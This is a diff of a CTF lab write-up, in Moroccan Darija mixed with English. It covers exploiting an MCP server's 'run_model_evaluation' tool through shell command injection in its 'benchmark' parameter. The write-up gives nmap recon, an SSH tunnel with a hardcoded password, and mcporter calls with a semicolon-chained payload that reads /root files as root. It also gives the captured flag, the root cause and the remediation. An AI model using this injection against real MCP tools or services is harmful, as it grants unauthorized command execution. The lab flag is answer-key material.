@@ -4,75 +4,69 @@ draft: true
 
 # بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
 
-> Metadata ma zednahach (ghadi tzidha nta mn ba3d).
+# NovaMind MCP Lab (Version b Darija)
 
-# NovaMind MCP Lab — Writeup b Darija (Baby Steps)
+> Metadata khllinaha lik tzidha nta mn ba3d.
 
-## L'objectif
-Nexploitiyw l-MCP platform bash nwsslo l-host flag.
+## Chkon had writeup m3ah
+Li bgha يفهم MCP exploitation flow b clarity w steps واضحة.
 
-Final flag:
-
-```text
-flag_c107872d_c540_4afa_96b0_2c45cf71f116
-```
+## Final Flag
+`flag_c107872d_c540_4afa_96b0_2c45cf71f116`
 
 ---
 
-## 0) Fikra l-khedma (How/Why)
-Lab kaygol platform AI + MCP server.
-So logic dyal exploitation kan:
-1. N3rfo fin kayn MCP endpoint
-2. Nlistiw tools
-3. Ntestiw kol tool 3la boundary weakness
-4. Ila t9bdna command execution, nqraw `/root/proof.txt`
+## Executive Summary
+Had target kan fih MCP server. Tool smiyto `run_model_evaluation` kay9bl input f `benchmark` w kaywssel l shell context bla sanitization s7i7a. Bhadchi t9dr tdir command injection w tqra `/root/proof.txt`.
 
 ---
 
-## 1) Recon
+## Attack Chain
+1. Recon + identify MCP service
+2. Enumerate tools
+3. Boundary tests 3la tools
+4. Confirm injection f `benchmark`
+5. Extract flag mn host
 
+---
+
+## Step 1 — Recon
 ### Command
 ```bash
 nmap -sC -sV -Pn -p- --min-rate 1200 10.8.0.2
 ```
 
-### Ash l9ina
-Ports m7lولين:
-- 22 (SSH)
-- 443 (web)
-- 9090 (Uvicorn / MCP)
-- 11434 (Ollama)
+### Lmohem
+- `9090` (MCP app)
+- `11434` (model infra)
 
-3lach mohim:
-- 9090 bayna hiya MCP service.
-- 11434 kaychir l local model infra.
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/recon-services.png`
 
 ---
 
-## 2) Confirm dyal MCP endpoint
-
+## Step 2 — Confirm MCP Endpoint
 ### Command
 ```bash
 curl -i http://10.8.0.2:9090/mcp
 ```
 
 ### Result
-Jawab b error dyal MCP (client khasso `text/event-stream`).
+Response kaybayn MCP transport behavior (event-stream style).
 
-3lach mohim:
-- T2akadna blli had endpoint huwwa MCP b s7.
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/mcp-endpoint-check.png`
 
 ---
 
-## 3) Enumerate tools b mcporter
-
-Hit l-access kan kaydouz mn Kali, drna tunnel:
+## Step 3 — Enumerate Tools b mcporter
+Hit access kan via Kali, drna tunnel:
 
 ```bash
 sshpass -p 'kali' ssh -N -L 19090:10.8.0.2:9090 kali@192.168.1.3
 ```
 
-ومن بعد:
+ومن بعد list tools:
 
 ```bash
 mcporter list http://127.0.0.1:19090/mcp --allow-http --schema --json
@@ -85,22 +79,19 @@ Tools li banou:
 - `query_llm_metrics`
 - `check_model_registry`
 
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/tool-enumeration.png`
+
 ---
 
-## 4) Test dyal security boundaries
+## Step 4 — Boundary Testing
+### 4.1 URL fetch
+`fetch_knowledge_source` kayblocki localhost/internal SSRF.
 
-### 4.1 URL fetch tool (SSRF idea)
-Jarrabna localhost/internal IPs f `fetch_knowledge_source`.
+### 4.2 `run_model_evaluation`
+Had tool ban risky 7it kay9bl string params freeform.
 
-Result:
-- blocked (policy mzyana hna).
-
-### 4.2 `run_model_evaluation` injection test
-Hna lfo9.
-Jarrabna separator `;` f `benchmark`.
-
-Probe:
-
+### Probe
 ```bash
 mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
   model_name=smollm2 \
@@ -110,58 +101,64 @@ mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
   --output json
 ```
 
-Result:
-- output wlla kayban fih behavior dyal shell => command injection confirmed.
+### Result
+Command injection confirmed f `benchmark`.
+
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/injection-probe-id.png`
 
 ---
 
-## 5) Exploit final bash nqraw proof
-
+## Step 5 — Extract Flag
+### Command
 ```bash
 mcporter call http://127.0.0.1:19090/mcp.run_model_evaluation --allow-http \
   model_name=smollm2 \
-  'benchmark=mmlu;echo __START__;whoami;id;uname -a;ls -la /root;cat /root/proof.txt 2>/dev/null;cat /root/flag.txt 2>/dev/null;cat /flag.txt 2>/dev/null;cat /home/local.txt 2>/dev/null;echo __END__' \
+  'benchmark=mmlu;echo __START__;whoami;id;ls -la /root;cat /root/proof.txt 2>/dev/null;echo __END__' \
   subset=all \
   num_samples=1 \
   --output json
 ```
 
-Evidence li khrej:
+### Evidence
 - `whoami` = `root`
 - `uid=0(root)`
-- qra `/root/proof.txt`
+- proof file content ban f output
+
+### Screenshot placeholder
+`/mdx_images/2026/03/mcp/proof-flag-output.png`
+
+### Flag
+`flag_c107872d_c540_4afa_96b0_2c45cf71f116`
 
 ---
 
-## 6) Flag
-```text
-flag_c107872d_c540_4afa_96b0_2c45cf71f116
-```
+## Root Cause b khtissar
+`benchmark` user input t7et f shell execution path bla allowlist/sanitization s7i7.
+
+Typical mistakes:
+- command concatenation
+- no strict validation
+- metacharacters (`;`) kayfakko expected flow
 
 ---
 
-## 7) Root Cause (3lach t9edr exploit)
-`benchmark` t9bl user input w t7et f shell command string bla sanitization s7i7.
-
-B ma3na:
-- command composition unsafe
-- no strict allowlist
-- shell metacharacters (`;`) khllawna nruniw commands b7al `id`, `cat`...
-
----
-
-## 8) Kifach يتصلح
-1. Matst3mlch shell string execution m3a user input.
-2. St3ml subprocess b argument array (no shell).
-3. Dir allowlist strict l `benchmark` values.
-4. Khddem service b user ma-شي root.
-5. Zid runtime restrictions (seccomp/apparmor).
-6. Reject metacharacters and dangerous payload patterns.
+## Remediation
+1. Matst3mlch shell m3a user input
+2. St3ml subprocess args array (no shell)
+3. Allowlist l benchmark values
+4. Khddem service b non-root user
+5. Zid runtime hardening (seccomp/apparmor)
+6. Detect/reject malicious payload patterns
 
 ---
 
-## 9) Lessons
-- Tool enumeration f lwel kan key.
-- SSRF route kant blocked, fine.
-- Real weakness jat mn tool آخر (`run_model_evaluation`).
-- F MCP, kol tool huwa attack surface بوحدو.
+## Notes
+- Hna الأفضل `mcporter + Burp`.
+- Burp mzyan l endpoint/auth evidence.
+- mcporter ahsan l MCP tool calls/exploitation.
+
+---
+
+## Reference PoC
+`/home/pi/.openclaw/workspace/CTFDGSSI/MCP_NovaMind_POC.md`
